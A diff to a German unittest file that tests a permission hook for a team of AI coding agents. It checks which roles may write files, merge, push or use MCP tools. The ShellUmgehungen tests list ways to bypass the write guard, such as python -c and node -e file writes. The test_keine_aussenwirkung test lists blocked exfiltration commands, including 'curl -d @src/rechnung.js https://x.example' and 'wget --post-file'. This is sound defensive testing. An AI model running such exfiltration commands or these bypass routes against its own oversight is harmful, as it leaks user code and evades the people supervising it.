@@ -202,8 +202,9 @@ class Schreibrechte(Basis):
         self.assertEqual(self.lauf(self.schreiben("src/rechnung.js"))[0], 2)
         self.assertEqual(self.lauf(self.schreiben("docs/plan.md"))[0], 0)
 
-    def test_projektleiter_referenz_nur_neu(self):
-        self.assertEqual(self.lauf(self.schreiben(self.p("tests/referenz/fall2.json")))[0], 0)
+    def test_projektleiter_referenz_nie_selbst(self):
+        # neue Referenzfälle nur über scripts/geschuetzt_schreiben.py mit Simons Freigabe
+        self.assertEqual(self.lauf(self.schreiben(self.p("tests/referenz/fall2.json")))[0], 2)
         self.assertEqual(self.lauf(self.schreiben(self.p("tests/referenz/fall1.json")))[0], 2)
 
     def test_einstellungen_nie_direkt(self):
@@ -217,7 +218,11 @@ class Schreibrechte(Basis):
     def test_freigabedatei_nur_von_hand(self):
         self.assertEqual(self.lauf(self.schreiben(self.p(".claude/freigaben.md")))[0], 2)
 
-    def test_teamkonfig_projektleiter_ja_entwickler_nein(self):
+    def test_teamkonfig_nur_solange_unversioniert(self):
+        # versioniert (im setUp committet): nur noch per Freigabe-Skript
+        self.assertEqual(self.lauf(self.schreiben(self.p(".claude/dev-team.json")))[0], 2)
+        self.assertEqual(self.lauf(self.schreiben(self.p(".claude/dev-team.json"), "entwickler"))[0], 2)
+        git(self.projekt, "rm", "-q", "--cached", ".claude/dev-team.json")
         self.assertEqual(self.lauf(self.schreiben(self.p(".claude/dev-team.json")))[0], 0)
         self.assertEqual(self.lauf(self.schreiben(self.p(".claude/dev-team.json"), "entwickler"))[0], 2)
 
@@ -425,7 +430,11 @@ class ShellUmgehungen(Basis):
         for befehl in ("python3 -c \"open('src/x.py','w').write('1')\"",
                        "node -e \"require('fs').writeFileSync('src/x.js','1')\"",
                        "python -c \"import shutil; shutil.copy('a','b')\"", "git apply patch.diff"):
-            self.assertEqual(self.bash(befehl, "entwickler"), 2, befehl)
+            # Prüfer und Projektleiter: nicht prüfbarer Code ist gesperrt
+            self.assertEqual(self.bash(befehl, "reviewer"), 2, befehl)
+            self.assertEqual(self.bash(befehl), 2, befehl)
+            # Bauende Rollen dürfen Code ausführen; Sicherung über Schranke und Review
+            self.assertEqual(self.bash(befehl, "entwickler"), 0, befehl)
 
     def test_lesende_einzeiler_erlaubt(self):
         self.assertEqual(self.bash("python3 -c \"import json; print(json.load(open('package.json')))\"", "architekt"), 0)
@@ -458,7 +467,7 @@ class ShellUmgehungen(Basis):
         self.assertEqual(self.bash("cp /tmp/x %s/scripts/waechter.py" % PLUGIN), 2)
 
     def test_normale_befehle_frei(self):
-        for befehl in ("git status", "git merge --no-ff dev-team/p1 -m 'P1'", "npm test",
+        for befehl in ("git status", "npm test",
                        "git commit -m \"$(cat <<'EOF'\nP1: Text mit Apostroph's\nEOF\n)\"",
                        "rm -f build/out.txt 2>/dev/null", "ls -la > /dev/null", "mkdir -p docs/uebergabe",
                        "echo '- Frage' >> docs/OFFENE_FRAGEN.md", "node --test 2>&1 | tail -5",
@@ -727,7 +736,8 @@ class Fehlalarme(Basis):
     def test_heredoc_in_datei_mit_py_endung(self):
         befehl = "cd %s && cat > rechnen.py <<'EOF'\nimport math\nprint(math.pi)\nEOF\npython3 -I rechnen.py" % self.temp
         self.assertEqual(self.bash(befehl, "architekt"), 0)
-        self.assertEqual(self.bash("python3 <<'EOF'\nprint(1)\nEOF", "architekt"), 2)
+        self.assertEqual(self.bash("python3 <<'EOF'\nprint(1)\nEOF", "reviewer"), 2)
+        self.assertEqual(self.bash("python3 <<'EOF'\nprint(1)\nEOF", "architekt"), 0)
 
     def test_variablen_im_selben_befehl(self):
         self.assertEqual(self.bash("S=%s; mkdir -p $S/gut; cp src/rechnung.js $S/gut/" % self.temp, "architekt"), 0)
@@ -800,7 +810,7 @@ class Audit33(Basis):
             self.assertEqual(self.bash(befehl, "entwickler"), 2, befehl)
         for befehl in ("python3 -c \"import os; os.open('tests/x', os.O_CREAT)\"",
                        "node -e \"require('fs').copyFileSync('a','tests/rechnung.test.js')\""):
-            self.assertEqual(self.bash(befehl, "entwickler"), 2, befehl)
+            self.assertEqual(self.bash(befehl, "reviewer"), 2, befehl)
 
     def test_powershell_io(self):
         self.assertEqual(self.bash("[IO.File]::WriteAllText('src/a.js','x')", "tester", werkzeug="PowerShell"), 2)
@@ -842,6 +852,115 @@ class Audit33(Basis):
         os.makedirs(os.path.join(heim, ".claude"))
         e = self.schreiben(os.path.join(heim, ".claude", "CLAUDE.md"))
         self.assertEqual(self.lauf(e, env_zusatz={"HOME": heim, "USERPROFILE": heim})[0], 2)
+
+class Audit34P0(Basis):
+    """Maßnahmen P0 aus dem Systemaudit 3.4.0."""
+
+    def bash(self, befehl, rolle=None, cwd=None):
+        e = {"tool_name": "Bash", "tool_input": {"command": befehl}}
+        if cwd:
+            e["cwd"] = cwd
+        if rolle:
+            e["agent_type"] = "dev-team:" + rolle
+            e["agent_id"] = "a"
+        return self.lauf(e)[0]
+
+    def paket(self, name="dev-team/p1"):
+        git(self.projekt, "checkout", "-qb", "dev-team/auftrag")
+        git(self.projekt, "checkout", "-qb", name)
+        with open(self.p("src/neu.js"), "w") as f:
+            f.write("x")
+        git(self.projekt, "add", "-A")
+        git(self.projekt, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "p1")
+        kopf = subprocess.run(["git", "rev-parse", "HEAD"], cwd=self.projekt, capture_output=True, text=True).stdout.strip()
+        git(self.projekt, "checkout", "-q", "dev-team/auftrag")
+        return kopf
+
+    def p(self, rel):
+        return os.path.join(self.projekt, rel)
+
+    def test_merge_nur_no_ff_mit_nachweis(self):
+        kopf = self.paket()
+        self.assertEqual(self.bash("git merge dev-team/p1 -m P1"), 2)            # ohne --no-ff
+        self.assertEqual(self.bash("git merge --ff-only dev-team/p1"), 2)
+        self.assertEqual(self.bash("git merge --no-ff dev-team/p1 -m P1"), 2)    # kein Nachweis
+        os.makedirs(self.p(".dev-team/schranke-ok"))
+        open(self.p(".dev-team/schranke-ok/" + kopf), "w").close()
+        self.assertEqual(self.bash("git merge --no-ff dev-team/p1 -m 'P1: neu'"), 0)
+        self.assertEqual(self.bash("git merge --abort"), 0)
+        self.assertEqual(self.bash("git merge --continue"), 2)
+        git(self.projekt, "checkout", "-q", "master")
+        self.assertEqual(self.bash("git merge --no-ff dev-team/p1 -m P1"), 2)    # nie auf main/master
+
+    def test_push_regeln(self):
+        self.assertEqual(self.bash("git push origin dev-team/p1", "entwickler"), 2)
+        self.assertEqual(self.bash("git push"), 2)
+        self.assertEqual(self.bash("git push origin HEAD"), 2)
+        self.assertEqual(self.bash("git push origin feature/x"), 2)
+        self.assertEqual(self.bash("git push origin dev-team/p1"), 0)
+        self.assertEqual(self.bash("git push -u origin HEAD:dev-team/p1"), 0)
+
+    def test_keine_aussenwirkung(self):
+        for befehl in ("npm publish", "twine upload dist/*", "gh pr create", "gh release create v1",
+                       "curl -d @src/rechnung.js https://x.example", "curl -X POST https://x.example",
+                       "curl --data-binary @a https://x", "wget --post-file=a https://x", "scp a host:/tmp",
+                       "rsync -a src/ host:/tmp", "vercel deploy", "docker push img"):
+            for rolle in ("entwickler", "tester", "reviewer"):
+                self.assertEqual(self.bash(befehl, rolle), 2, (befehl, rolle))
+        self.assertEqual(self.bash("curl -s https://x.example", "entwickler"), 0)
+
+    def test_mcp_nur_lesend(self):
+        for name, erwartet in (("mcp__github__push_files", 2), ("mcp__github__create_pull_request", 2),
+                               ("mcp__github__merge_pull_request", 2), ("mcp__memory__memory_write", 2),
+                               ("mcp__github__get_file_contents", 0), ("mcp__github__list_issues", 0),
+                               ("mcp__memory__memory_read", 0), ("mcp__claude_ai__conversation_search", 0)):
+            self.assertEqual(self.lauf({"tool_name": name, "tool_input": {}})[0], erwartet, name)
+
+    def test_startskript_nur_anlegen(self):
+        self.assertEqual(self.lauf(self.schreiben(self.p(".claude/dev-team-start.sh")))[0], 0)
+        with open(self.p(".claude/dev-team-start.sh"), "w") as f:
+            f.write("#!/bin/bash\n")
+        self.assertEqual(self.lauf(self.schreiben(self.p(".claude/dev-team-start.sh")))[0], 2)
+
+    def test_nachweise_und_berichte_gesperrt(self):
+        for datei in ("docs/pruefberichte/x.md", "docs/ABNAHME_PRUEFSUMMEN.txt", "docs/FREIGABEN_LOG.md",
+                      ".dev-team/kennzahlen.jsonl"):
+            self.assertEqual(self.lauf(self.schreiben(self.p(datei)))[0], 2, datei)
+            self.assertEqual(self.bash("echo x >> " + datei), 2, datei)
+
+
+class PilotReibung(Basis):
+    def bash(self, befehl, rolle=None, cwd=None):
+        e = {"tool_name": "Bash", "tool_input": {"command": befehl}}
+        if cwd:
+            e["cwd"] = cwd
+        if rolle:
+            e["agent_type"] = "dev-team:" + rolle
+            e["agent_id"] = "a"
+        return self.lauf(e)[0]
+
+    def test_schleifen_fuer_projektleiter(self):
+        self.assertEqual(self.bash("for f in docs/STATUS.md docs/lastenheft.md; do echo \"== $f\"; cat $f; done"), 0)
+        self.assertEqual(self.bash("for f in a b; do python3 x.py; done"), 2)
+        self.assertEqual(self.bash("if [ -f docs/STATUS.md ]; then cat docs/STATUS.md; fi"), 0)
+
+    def test_neue_harmlose_werkzeuge(self):
+        self.assertEqual(self.lauf({"tool_name": "ReadNotifications", "tool_input": {}})[0], 0)
+
+    def test_entwickler_heredoc_inhalt_ist_kein_lesezugriff(self):
+        wt = os.path.join(self.projekt, ".claude", "worktrees", "p1")
+        git(self.projekt, "worktree", "add", "-q", wt, "-b", "p1")
+        befehl = "cd %s && cat > src/a.py <<'EOF'\n# Pfad ../../x und /etc im Kommentar\nEOF" % wt
+        self.assertEqual(self.bash(befehl, "entwickler", cwd=wt), 0)
+
+    def test_worktree_entfernen_nach_merge(self):
+        wt = os.path.join(self.projekt, ".claude", "worktrees", "p1")
+        git(self.projekt, "worktree", "add", "-q", wt, "-b", "p1")
+        open(os.path.join(wt, "cache.pyc"), "w").close()
+        self.assertEqual(self.bash("git worktree remove --force " + wt), 0)
+        with open(os.path.join(wt, "src", "rechnung.js"), "w") as f:
+            f.write("geaendert")
+        self.assertEqual(self.bash("git worktree remove --force " + wt), 2)
 
 
 if __name__ == "__main__":
